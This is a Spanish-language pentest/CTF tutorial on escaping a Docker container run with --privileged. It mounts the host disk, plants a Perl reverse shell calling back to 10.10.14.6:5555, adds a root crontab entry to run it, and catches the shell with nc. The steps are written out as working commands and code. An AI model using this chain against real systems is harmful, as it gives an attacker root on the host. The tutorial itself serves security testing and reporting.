# 🐳 Docker Container Escape con `--privileged`

---

## Contexto

En un pentest o CTF podemos toparnos con contenedores Docker mal configurados. Un error muy común es ejecutarlos con la opción `--privileged`, que básicamente **le da al contenedor el control casi completo sobre el host**.

Esto rompe el aislamiento que se espera de Docker. Desde dentro del contenedor se pueden ver y manipular dispositivos del host que normalmente deberían estar ocultos, como `/dev/sda` (discos duros reales del sistema).

Si logramos montar una partición del host desde dentro del contenedor, ya tenemos acceso directo al **sistema de archivos del host** y, con algo de imaginación, podemos **escalar fuera del contenedor y obtener root en la máquina física**.

---

## Identificación del problema

1. **Comprobar los dispositivos disponibles en el contenedor:**

   ```bash
   ls /dev/ | grep sda
   ```

   Si aparecen particiones (`sda`, `sda1`, `sda2`, etc.), es una bandera roja: el contenedor está viendo discos del host.

2. **¿Por qué ocurre esto?**

   * `--privileged` expone casi todos los dispositivos del host al contenedor.
   * En condiciones normales, un contenedor no debería ver discos físicos reales.
   * Este error abre la puerta a montar el FS del host y manipularlo.

---

## Montaje del host

Creamos un directorio dentro del contenedor para montar la partición:

```bash
mkdir /mnt/host
mount /dev/sda2 /mnt/host
```

Ahora `/mnt/host` contiene el **sistema de archivos del host real**. Aquí ya tenemos acceso a todo: `/etc/`, `/root/`, `/home/`, `/var/log/`…

⚠️ Esto significa que podemos **leer y escribir directamente en el host**. Cualquier cambio que hagamos aquí afecta al host, no al contenedor.

---

## Escape y shell en el host

Una técnica sencilla para salir del contenedor es **forzar al host a ejecutar un script que nos dé una reverse shell**.

### 1. Crear el script en el host montado

Guardamos un reverse shell en `/mnt/host/tmp/reverse.sh`:

```bash
#!/bin/bash
perl -e 'use Socket;$i="10.10.14.6";$p=5555;
  socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
  if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("sh -i");
  };'
```

Le damos permisos:

```bash
chmod +x /mnt/host/tmp/reverse.sh
```

### 2. Hacer que el host lo ejecute

Existen varias formas de obligar al host a ejecutar este script. Una de las más simples es **editar el crontab del host** (el que está montado en `/mnt/host/etc/crontab`) y añadir una línea como:

```bash
* * * * * root /tmp/reverse.sh
```

De esta forma, cada minuto el host ejecutará nuestro script como **root**.

### 3. Ponerse a la escucha

En nuestra máquina atacante:

```bash
nc -lvnp 5555
```

En cuanto el cron ejecute el script, recibiremos una **reverse shell como root en el host** (fuera del contenedor).

---

## Explicación paso a paso

* **Ver `/dev/sda` dentro de un contenedor** → confirmación de que está mal configurado con `--privileged`.
* **Montar `/dev/sda2`** → obtenemos acceso directo al sistema de archivos real del host.
* **Crear un reverse shell en `/mnt/host/tmp/`** → el script realmente se guarda en `/tmp/` del host.
* **Modificar `/mnt/host/etc/crontab`** → estamos alterando la configuración de tareas programadas del host, no del contenedor.
* **Ponerse en escucha** → cuando cron ejecute nuestro script, conseguimos shell como root en el host.

---

## Notas importantes

* El flag `--privileged` es **peligrosísimo**: elimina el aislamiento y convierte al contenedor en una especie de proceso privilegiado con visibilidad total del host.
* Ver discos (`/dev/sda`) dentro de un contenedor siempre es mala señal.
* Montar y modificar el FS del host permite desde **leer credenciales** hasta **inyectar binarios, llaves SSH o shells**.
* Este vector equivale a un **Container Escape → Host Takeover**.

---

## Resumen

1. Acceso inicial: contenedor con `--privileged`.
2. Identificación: `/dev/sda` visible.
3. Montaje: `mount /dev/sda2 /mnt/host`.
4. Persistencia/escape: escribir reverse shell en `/mnt/host/tmp/`.
5. Ejecución: modificar `/mnt/host/etc/crontab`.
6. Resultado: **root en el host**.

👉 En un pentest real, esto debe reportarse como una **vulnerabilidad crítica**: el aislamiento de contenedores queda roto y el atacante puede comprometer completamente el host físico.
